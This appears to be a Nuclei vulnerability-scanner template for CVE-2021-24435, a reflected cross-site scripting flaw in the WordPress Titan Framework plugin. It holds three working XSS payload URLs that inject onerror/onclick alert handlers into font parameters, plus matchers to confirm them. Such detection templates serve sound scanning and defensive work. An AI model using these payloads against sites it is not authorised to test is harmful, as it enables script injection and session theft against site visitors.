http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - condition: and
    regex:
    - (?i)(onerror=|onclick=)['"]?alert\(document\.domain\)['"]?
    - <p>Grumpy wizards make
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=%27/onerror=%27alert(document.domain)%27/b=%27'
  - '{{BaseURL}}/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20onerror=alert(document.domain)%20b=%27'
  - '{{BaseURL}}/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20accesskey=%27x%27%20onclick=%27alert(document.domain)%27%20class=%27'
  stop-at-first-match: true
id: CVE-2021-24435
info:
  author: xcapri,ritikchaddha
  classification:
    cpe: cpe:2.3:a:gambit:titan_framework:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24435
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.49496
    epss-score: 0.0014
  description: 'The iframe-font-preview.php file of the titan-framework does not properly
    escape the font-weight and font-family GET parameters before outputting them back
    in an href attribute, leading to Reflected Cross-Site Scripting issues.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: titan_framework
    vendor: gambit
    verified: true
  name: WordPress Titan Framework plugin <= 1.12.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/a88ffc42-6611-406e-8660-3af24c9cc5e8
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24435
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24435
  - https://patchstack.com/database/vulnerability/titan-framework/wordpress-titan-framework-plugin-1-12-1-reflected-cross-site-scripting-xss-vulnerability
  - https://github.com/ARPSyndicate/cvemon
  remediation: Fixed in version 2.7.12
  severity: medium
  tags: cve2021,cve,wp,xss,wp-plugin,titan-framework,wpscan,wordpress,gambit
